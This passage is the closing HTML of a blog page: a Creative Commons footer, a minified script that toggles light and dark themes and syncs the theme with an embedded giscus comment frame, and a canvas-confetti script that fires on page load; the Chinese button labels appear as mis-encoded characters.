href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh target=_blank rel=noopener><span class="iconfont icon-creative-commons-fill"></span></a></span></div><div class=blog-icon></div></footer></div><script>document.addEventListener("DOMContentLoaded",function(){const n=localStorage.getItem("theme")||"light",e=document.querySelector('link[data-theme-style="light"]'),t=document.querySelector('link[data-theme-style="dark"]'),i=window.matchMedia("(prefers-color-scheme: dark)");i.addListener(function(n){if(!localStorage.getItem("theme")){const s=n.matches?"dark":"light";document.documentElement.setAttribute("data-theme",s),localStorage.setItem("theme",s),s==="light"?(e.media="all",t.media="not all"):(e.media="not all",t.media="all");const o=document.querySelector("iframe.giscus-frame");if(o){const e=s==="light"?"light_tritanopia":"dark_tritanopia";o.contentWindow.postMessage({giscus:{setConfig:{theme:e}}},"https://giscus.app")}}}),n==="light"?(e.media="all",t.media="not all"):(e.media="not all",t.media="all");function o(){const e=document.querySelector("iframe.giscus-frame");if(e){const t=n==="light"?"light_tritanopia":"dark_tritanopia";e.contentWindow.postMessage({giscus:{setConfig:{theme:t}}},"https://giscus.app")}else setTimeout(o,1e3)}o();const s=document.querySelector(".theme-toggle");s&&(s.textContent=n==="light"?"é»‘æš—":"æ˜äº®",s.addEventListener("click",function(){const o=document.documentElement.getAttribute("data-theme"),n=o==="light"?"dark":"light";document.documentElement.setAttribute("data-theme",n),localStorage.setItem("theme",n),n==="light"?(e.media="all",t.media="not all"):(e.media="not all",t.media="all");const s=document.querySelector("iframe.giscus-frame");if(s){const e=n==="light"?"light_tritanopia":"dark_tritanopia";s.contentWindow.postMessage({giscus:{setConfig:{theme:e}}},"https://giscus.app")}this.textContent=n==="light"?"é»‘æš—":"æ˜äº®"}))})</script><script src=https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.3/dist/confetti.browser.min.js></script><script>document.addEventListener("DOMContentLoaded",function(){confetti({particleCount:150,spread:100})})</script></body></html>